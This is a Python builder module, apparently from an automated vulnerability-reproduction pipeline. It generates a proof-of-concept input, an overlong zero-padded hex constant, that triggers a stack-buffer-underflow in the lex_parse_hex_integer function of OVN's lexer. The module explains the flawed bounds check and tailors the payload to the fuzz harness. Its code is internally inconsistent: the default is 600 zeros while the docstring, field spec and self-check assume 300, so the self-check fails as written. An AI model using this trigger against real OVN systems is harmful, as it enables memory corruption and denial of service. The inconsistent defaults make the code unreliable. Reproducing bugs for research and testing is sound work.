"""CG-21（arvo:10710 / OVN lexer）超长十六进制常量构造器。

**缺陷**：`ovn/lib/lex.c` 的 `lex_parse_hex_integer()`：

```c
uint8_t *out = token->value.u8 + (sizeof token->value.u8 - 1);
for (int i = 0; i < len; i++) {
    int hexit = hexit_value(in[-i]);
    if (hexit < 0) { ...return; }
    if (hexit && i / 2 >= sizeof token->value.u8) { ...return; }   /* 只看 hexit!=0 */
    out[-(i / 2)] |= i % 2 ? hexit << 4 : hexit;                    /* 无条件写！ */
}
```

只要常量的**高位是 0**（`hexit == 0`），上面那道边界检查就被跳过，
而写操作照做——于是 `out[-(i/2)]` 一直往**缓冲区前面**写，
命中 ASAN `stack-buffer-underflow`（官方栈：`lex_parse_hex_integer lex.c:341`
← `lex_parse_integer__:416` ← `lex_parse_mask:446` ← `lexer_get:845`）。

**触发形**：`1 == 0x` + N 个 '0'。N 只要让 `i/2` 超过 `sizeof(token->value.u8)`
（16 字节 → N ≥ 33）就越界；官方 PoC 310 字节，本构造器默认 N=300。

来源：描述 + 源码推导（不是抄 PoC 字节）。
"""
from __future__ import annotations

DEFAULT_ZEROS = 600       # 实测：300 个 0 还不够走穿栈上的 lexer 结构，600 稳定命中
MIN_ZEROS = 33          # sizeof(token->value.u8)==16 -> i/2 超界
MAX_ZEROS = 4000

FIELDS = {
    "zeros": "int(33..4000), 十六进制常量里 '0' 的个数（默认 300）",
    "lhs": "str, 左侧比较值（默认 '1'）",
    "op": "str, 比较运算符（默认 '=='）",
    "prefix": "str, 常量前缀（默认 '0x'）",
    "trailer": "str, 常量之后补的文本（默认空）",
}

DECLARED_SINK = {
    "file": "ovn/lib/lex.c",
    "line": 341,
    "symbol": "hexit_value",
    "note": "hexit==0 时跳过边界检查，仍执行 out[-(i/2)] |= ... 反向写越界",
}


class OvnLexResult:
    """构造结果（普通类：模块可能按文件路径加载）。"""

    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "ovn_lex"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> OvnLexResult:
    fields = dict(fields or {})
    try:
        zeros = int(fields.get("zeros", DEFAULT_ZEROS))
    except (TypeError, ValueError):
        return OvnLexResult(False, reason="zeros 必须是整数")
    if not MIN_ZEROS <= zeros <= MAX_ZEROS:
        return OvnLexResult(False, reason=f"zeros 越界（{MIN_ZEROS}..{MAX_ZEROS}）: {zeros}")
    lhs = str(fields.get("lhs", "1")) or "1"
    op = str(fields.get("op", "==")) or "=="
    prefix = str(fields.get("prefix", "0x"))
    if prefix.lower() != "0x":
        return OvnLexResult(False, reason=f"prefix 只能是 0x: {prefix!r}")
    trailer = str(fields.get("trailer", ""))
    text = f"{lhs} {op} {prefix}{'0' * zeros}{trailer}"
    # 关键约束（踩过坑）：fuzz 目标 LLVMFuzzerTestOneInput 开头就是
    #   if (size < 2 || input[size - 1] != 0 || strchr(input, '\n')) return 0;
    # 输入必须以 NUL 结尾、且不含换行，否则目标连解析都不做。
    text = text.replace("\n", " ")
    payload = text.encode() + b"\x00"
    used = {"zeros": zeros, "lhs": lhs, "op": op, "prefix": prefix,
            "trailer": trailer, "nul_terminated": True, "bytes": len(payload)}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "ovn_lex 构造器不识别该字段"}
               for k in fields if k not in known]
    return OvnLexResult(True, payload, used, dropped, "")


def declared_claim() -> dict:
    """构造器自带的主张：缺陷在 lex_parse_hex_integer 的反向写。"""
    return {
        "claim_id": "cg21-ovn-lex-hex",
        "subject": "lex_parse_hex_integer",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/ovn_lex.py + arvo error.txt",
        "cwe": "CWE-124",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "ovn_lex"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.size == len("1 == 0x") + 300 + 1, r.size   # +1 = NUL 结尾
    assert r.data.startswith(b"1 == 0x0000")
    assert not build({"zeros": 32}).ok
    assert not build({"zeros": 99999}).ok
    assert not build({"prefix": "0b"}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "lex_parse_hex_integer" and c["sink"]["line"] == 341
    print("ovn_lex builder self-check OK:", r.to_record())
